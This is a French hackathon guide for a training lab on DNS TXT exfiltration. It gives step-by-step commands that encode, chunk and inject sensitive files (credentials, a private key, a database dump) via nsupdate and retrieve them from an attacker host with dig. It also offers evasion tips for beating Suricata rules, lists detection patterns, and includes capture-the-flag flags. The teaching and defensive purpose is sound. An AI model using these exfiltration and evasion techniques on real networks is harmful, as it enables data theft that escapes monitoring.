# Opération GHOST PIPE — Hackathon DNS Exfiltration

## Contexte et scénario

**Public** : BTS SIO 2 (SLAM & SISR) — **Durée** : 6-7h (journée complète)

### Le pitch

L'entreprise **Corp Industries** suspecte qu'un poste de travail de la direction financière a été compromis. Le SOC (Security Operations Center) a repéré des anomalies dans les logs DNS mais n'a pas encore compris la technique utilisée.

Votre mission se déroule en deux temps. D'abord, dans la peau de l'attaquant, vous allez comprendre et reproduire une technique d'exfiltration de données via les enregistrements DNS TXT — la même technique qui a récemment permis à un chercheur en sécurité de faire tourner le jeu DOOM entièrement depuis des records DNS. Ensuite, dans la peau du défenseur, vous configurerez des règles de détection Suricata pour identifier et bloquer ce type d'attaque.

### Pourquoi le DNS ?

Le DNS est le protocole le plus discret du réseau. Les enregistrements TXT peuvent contenir du texte arbitraire (jusqu'à ~2000 caractères), ils ne sont ni validés ni filtrés par les firewalls classiques, et chaque requête est parfaitement légitime du point de vue protocolaire. C'est ce qui en fait un vecteur d'exfiltration redoutable — et un sujet d'étude essentiel pour des futurs professionnels de l'informatique.

### Compétences mobilisées (référentiel BTS SIO)

Le hackathon couvre des compétences des deux options. En SISR, on travaille l'administration de services réseau (Bind9, nsupdate, DNS zones), la supervision et la détection d'incidents (Suricata, analyse de logs EVE JSON), et la segmentation réseau (compréhension du cloisonnement interne/externe). En SLAM, le focus est sur le scripting (Bash et Python), l'encodage et la manipulation de données (Base64, SHA256, découpage en chunks), et la compréhension des protocoles applicatifs exploités par le code.


---

## Architecture technique

### Vue d'ensemble

```
   [net-external 172.30.0.0/24]           [net-internal 172.20.0.0/24]
          │                                         │
    ┌─────┴──────┐                           ┌──────┴───────┐
    │  attacker   │                           │  workstation │
    │ 172.30.0.10 │                           │ 172.20.0.10  │
    │ (kali-ext)  │                           │(pc-finance)  │
    └─────┬──────┘                           └──────┬───────┘
          │                                         │
          │          ┌───────────────┐              │
          └──────────┤  dns-server   ├──────────────┘
                     │ ext:172.30.0.53              │
                     │ int:172.20.0.53              │
                     │  (ns1.corp.local)            │
                     └───────┬───────┘
                             │ network namespace
                     ┌───────┴───────┐
                     │  ids-suricata │
                     │  (monitoring) │
                     └───────────────┘
```

### Machines et rôles

Le **serveur DNS** (ghost-dns) est un Bind9 connecté aux deux réseaux. Il fait autorité sur la zone `corp.local` et accepte les mises à jour dynamiques depuis la workstation. C'est le pivot central — les données injectées côté interne deviennent accessibles côté externe via des requêtes DNS standards.

La **workstation** (ghost-workstation) simule le poste compromis du service comptabilité. Elle contient quatre fichiers sensibles dans `/home/employe/documents/` : un mémo confidentiel sur un projet d'acquisition, un fichier CSV de credentials, une clé privée RSA et un dump de base de données clients. Elle dispose de `dig`, `nsupdate`, `python3`, `base64`, et des outils classiques.

La machine **attaquant** (ghost-attacker) est sur le réseau externe. Elle ne peut communiquer qu'avec le serveur DNS sur le port 53 — exactement comme un attaquant réel qui n'aurait accès qu'aux résolutions DNS publiques. Son répertoire de travail est `/home/attacker/loot/`.

L'**IDS Suricata** (ghost-ids) partage le namespace réseau du serveur DNS. Il voit donc tout le trafic DNS entrant et sortant. Ses logs sont dans `/var/log/suricata/` (fast.log pour les alertes, eve.json pour le détail).


---

## Déroulement de la journée

### Phase 0 — Découverte de l'environnement (30 min)

Les étudiants prennent en main l'infrastructure, vérifient la connectivité réseau, explorent les fichiers disponibles sur la workstation et effectuent leurs premières requêtes DNS.

**Exercices de prise en main** :

1. Se connecter à chaque machine via `docker exec -it <nom> bash`
2. Depuis la workstation, résoudre `pc-finance.corp.local` : `dig A pc-finance.corp.local @172.20.0.53`
3. Lister les enregistrements TXT existants : `dig TXT corp.local @172.20.0.53`
4. Depuis l'attaquant, tenter un transfert de zone : `dig AXFR corp.local @172.30.0.53`
5. Observer l'alerte Suricata générée : `docker exec ghost-ids tail /var/log/suricata/fast.log`
6. Lister les fichiers sensibles : `ls -la /home/employe/documents/`


### Phase 1 — Injection DNS (1h30)

**Objectif** : depuis la workstation compromise, encoder un fichier et l'injecter dans le DNS sous forme d'enregistrements TXT.

**Étape 1a — Injection manuelle d'un petit fichier (45 min)**

Les étudiants travaillent d'abord manuellement pour comprendre chaque opération.

Commencer par encoder le mémo confidentiel :

```bash
base64 -w 0 /home/employe/documents/memo-confidentiel.txt > /tmp/memo.b64
wc -c /tmp/memo.b64
```

Calculer le hash d'intégrité du fichier original :

```bash
sha256sum /home/employe/documents/memo-confidentiel.txt
```

Découper le base64 en chunks de 250 caractères :

```bash
split -b 250 /tmp/memo.b64 /tmp/chunk-
ls -la /tmp/chunk-*
```

Injecter un chunk manuellement avec nsupdate :

```bash
nsupdate << EOF
server 172.20.0.53
zone corp.local
update add chunk-001.exfil.corp.local. 3600 TXT "$(cat /tmp/chunk-aa)"
send
EOF
```

Vérifier l'injection :

```bash
dig TXT chunk-001.exfil.corp.local @172.20.0.53
```

**Étape 1b — Script d'injection automatisé (45 min)**

Les étudiants écrivent un script Bash ou Python qui automatise tout le pipeline : encodage → hash → découpage → injection via nsupdate → vérification.

Le script doit gérer : le record de métadonnées (chunk-000) contenant le nom du fichier, le nombre de chunks, le hash SHA256 et la taille originale ; la numérotation séquentielle des chunks (chunk-001, chunk-002...) ; et un minimum de gestion d'erreurs.

Le format de métadonnées attendu est `filename|nb_chunks|sha256|taille_originale`, stocké dans `chunk-000.<subdomain>.corp.local`.


### Phase 2 — Extraction DNS (1h30)

**Objectif** : depuis la machine attaquant, récupérer les données en interrogeant le DNS.

**Étape 2a — Extraction manuelle du mémo (30 min)**

Depuis l'attaquant, récupérer les métadonnées :

```bash
dig +short TXT chunk-000.exfil.corp.local @172.30.0.53
```

Puis les chunks un par un :

```bash
dig +short TXT chunk-001.exfil.corp.local @172.30.0.53 | tr -d '"'
dig +short TXT chunk-002.exfil.corp.local @172.30.0.53 | tr -d '"'
# ...
```

Réassembler et décoder :

```bash
# Concaténer tous les chunks puis décoder
echo "<chunks concaténés>" | base64 -d > /home/attacker/loot/memo.txt
```

Vérifier l'intégrité :

```bash
sha256sum /home/attacker/loot/memo.txt
# Comparer avec le hash des métadonnées
```

**Étape 2b — Script d'extraction automatisé (1h)**

Écrire un script qui lit les métadonnées, boucle sur tous les chunks, réassemble et vérifie le hash. Tester sur les fichiers plus volumineux (credentials.csv, serveur-prod.key, dump-clients-prod.sql).

La difficulté augmente avec la taille : le dump SQL produit plus de chunks et oblige à gérer la robustesse (retries, chunks manquants).


### Phase 3 — Détection et défense avec Suricata (1h30)

**Objectif** : écrire des règles Suricata pour détecter l'exfiltration.

**Étape 3a — Analyse des logs existants (30 min)**

Observer les alertes déjà générées par R1 et R2 :

```bash
docker exec ghost-ids cat /var/log/suricata/fast.log
```

Analyser les logs JSON pour comprendre la structure :

```bash
docker exec ghost-ids jq 'select(.dns)' /var/log/suricata/eve.json | head -50
```

Identifier les patterns caractéristiques : sous-domaines "exfil" et "chunk-", volume de requêtes, taille des réponses.

**Étape 3b — Activation et écriture de règles (1h)**

Le fichier `ghost-pipe.rules` contient 8 règles dont seulement 2 sont actives. Les étudiants doivent décommenter et adapter R3 à R5, puis écrire R6 et R7 de zéro. R8 (détection base64 par regex) est un bonus.

Pour modifier les règles :

```bash
docker exec -it ghost-ids vim /var/lib/suricata/rules/ghost-pipe.rules
```

Recharger Suricata après modification :

```bash
docker exec ghost-ids kill -USR2 $(docker exec ghost-ids pgrep suricata)
```

Puis relancer une exfiltration depuis la workstation et vérifier que les nouvelles alertes apparaissent dans fast.log.

**Grille d'évaluation des règles** :

La règle R3 (détection "exfil") et la règle R4 (détection "chunk-") valent chacune 1 point — ce sont des décommentages simples avec compréhension du content match. La règle R5 (threshold volumétrique) vaut 2 points — elle nécessite de comprendre le mécanisme de seuil et de choisir des valeurs pertinentes. La règle R6 (nsupdate / opcode UPDATE) vaut 3 points — elle demande une recherche sur les opcodes DNS et la rédaction complète d'une règle. La règle R7 (taille des réponses) vaut 2 points — il faut comprendre l'inversion de direction (serveur → client) et le keyword dsize. La règle R8 bonus (regex base64) vaut 3 points — elle exige de maîtriser pcre dans Suricata.


### Phase 4 — Évasion et contre-mesures (45 min — si le temps le permet)

**Objectif** : contourner les règles Suricata qu'on vient d'écrire.

Pistes à explorer pour les étudiants avancés :

Renommer les sous-domaines pour éviter les patterns "exfil" et "chunk-" (par exemple utiliser un UUID ou un hash comme nom). Fragmenter les requêtes dans le temps pour passer sous le seuil de R5. Utiliser plusieurs sous-domaines différents pour distribuer les chunks. Chiffrer les données avant l'encodage base64 pour contourner R8.

Pour chaque technique d'évasion trouvée, les étudiants proposent la contre-mesure Suricata correspondante.


### Phase 5 — Synthèse et restitution (30 min)

Chaque groupe présente en 5 minutes : la technique d'exfiltration utilisée, les règles Suricata écrites, et une technique d'évasion avec sa contre-mesure. Discussion collective sur les implications en entreprise.


---

## Guide Suricata — Référence rapide

### Anatomie d'une règle

```
action proto src_ip src_port -> dst_ip dst_port (options;)
```

L'**action** est généralement `alert` (loguer) ou `drop` (bloquer en mode IPS). Le **protocole** est `dns` pour les règles applicatives DNS, ou `udp`/`tcp` pour les règles réseau bas niveau. Les **adresses** utilisent les variables `$HOME_NET`, `$EXTERNAL_NET`, `$DNS_SERVERS` définies dans suricata.yaml. La **direction** `->` est importante : `client -> serveur` pour les requêtes, `serveur -> client` pour les réponses.

### Keywords DNS utiles

Le keyword `dns.query` matche sur le nom de domaine demandé. On peut le combiner avec `content:"pattern"` pour chercher une chaîne dans le FQDN, et `nocase` pour ignorer la casse.

Le keyword `dns.opcode` filtre par type d'opération DNS : 0 pour une requête standard (QUERY), 5 pour une mise à jour dynamique (UPDATE).

Le keyword `dsize` vérifie la taille du payload : `dsize:>300` matche les paquets de plus de 300 octets.

Le keyword `threshold` agrège les événements : `threshold:type both, track by_src, count 20, seconds 60` ne déclenche l'alerte qu'après 20 occurrences en 60 secondes depuis la même IP source.

Le keyword `pcre` permet les expressions régulières Perl : `pcre:"/[A-Za-z0-9+\/=]{50,}/"` détecte un bloc de 50+ caractères base64.

### Commandes utiles

```bash
# Voir les alertes en temps réel
tail -f /var/log/suricata/fast.log

# Filtrer les alertes dans les logs JSON
jq 'select(.alert)' /var/log/suricata/eve.json

# Voir uniquement les requêtes DNS
jq 'select(.dns)' /var/log/suricata/eve.json

# Compter les alertes par SID
jq -r 'select(.alert) | .alert.signature_id' /var/log/suricata/eve.json | sort | uniq -c | sort -rn

# Recharger les règles sans redémarrer
kill -USR2 $(pgrep suricata)

# Vérifier la syntaxe des règles
suricata -T -c /etc/suricata/suricata.yaml
```


---

## Flags et barème

| Flag | Fichier | Points | Phase |
|------|---------|--------|-------|
| `FLAG{dns_txt_exfil_phase1_memo_confidentiel}` | memo-confidentiel.txt | 2 | 1 |
| `FLAG{dns_txt_exfil_credentials_leaked}` | credentials.csv | 3 | 1+2 |
| `FLAG{dns_txt_exfil_private_key}` | serveur-prod.key | 3 | 1+2 |
| `FLAG{dns_txt_exfil_database_dump_complete}` | dump-clients-prod.sql | 4 | 1+2 |
| Règles R3-R4 activées et fonctionnelles | — | 2 | 3 |
| Règle R5 (threshold) configurée | — | 2 | 3 |
| Règle R6 (nsupdate) écrite | — | 3 | 3 |
| Règle R7 (dsize) écrite | — | 2 | 3 |
| Règle R8 bonus (pcre base64) | — | 3 | 3 |
| Technique d'évasion documentée | — | 2 | 4 |
| **Total** | | **26** | |


---

## Déploiement

### Prérequis

Docker et Docker Compose v2 installés sur la machine hôte. Environ 2 Go d'espace disque et 1 Go de RAM disponibles.

### Lancement

```bash
chmod +x start.sh
./start.sh
```

Le script construit les images, démarre les conteneurs et valide l'infrastructure (résolution DNS, nsupdate, Suricata, fichiers sensibles).

### Accès aux machines

```bash
docker exec -it ghost-workstation bash   # Poste compromis
docker exec -it ghost-attacker bash      # Machine attaquant
docker exec -it ghost-dns bash           # Serveur DNS
docker exec -it ghost-ids bash           # IDS Suricata
```

### Arrêt

```bash
docker compose down -v
```


---

## Fichiers de correction

Le répertoire `corrections/` contient les scripts de référence pour le formateur :

- `phase1-inject.sh` et `phase1-inject.py` : scripts d'injection (Bash et Python)
- `phase2-extract.sh` et `phase2-extract.py` : scripts d'extraction (Bash et Python)
- `ghost-pipe-CORRECTION.rules` : fichier Suricata complet avec toutes les règles actives et documentées
